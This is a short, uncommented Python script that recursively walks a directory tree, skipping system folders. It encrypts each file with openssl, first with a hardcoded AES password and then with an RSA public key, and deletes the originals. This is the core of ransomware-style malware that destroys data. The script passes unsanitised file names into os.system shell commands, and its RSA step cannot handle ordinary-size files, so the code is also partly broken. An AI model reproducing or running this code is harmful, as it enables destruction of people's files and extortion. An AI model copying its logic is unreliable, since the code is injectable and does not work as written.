import os,sys

aes_password="ricardo"
keypath="/home/test2/random/keys"
excluded_dirs=["bin","boot","etc","usr","lib","media"]


def encrypt_(fname):
	os.system("openssl aes-256-cbc -pass pass:"+aes_password+" -in "+fname+" -out "+fname+".aes")
	os.system("openssl rsautl -encrypt -pubin -inkey "+keypath+"/public.pem -in "+fname+".aes -out "+fname+".rsa")
	os.system("openssl aes-256-cbc -pass pass:"+aes_password+" -in "+fname+".rsa -out "+fname+".enc")
	os.system("rm "+fname+".aes")
	os.system("rm "+fname+".rsa")
	os.system("rm "+fname)


def enc_files(dir_):
	onlyfiles = [f for f in os.listdir(dir_) if os.path.isfile(os.path.join(dir_, f))]
	for f in onlyfiles:
		file=os.path.join(dir_, f)
		print "Encrypting",file,"..."
		encrypt_(file)

def loop(looped_dir):
	for root,directories,filenames in os.walk(looped_dir):
		for directory in directories:
			dir=os.path.join(root, directory)
			if directory not in excluded_dirs:
				print "Entering",dir,"..."
				enc_files(dir)

	#			loop(dir)


loop(sys.argv[1])
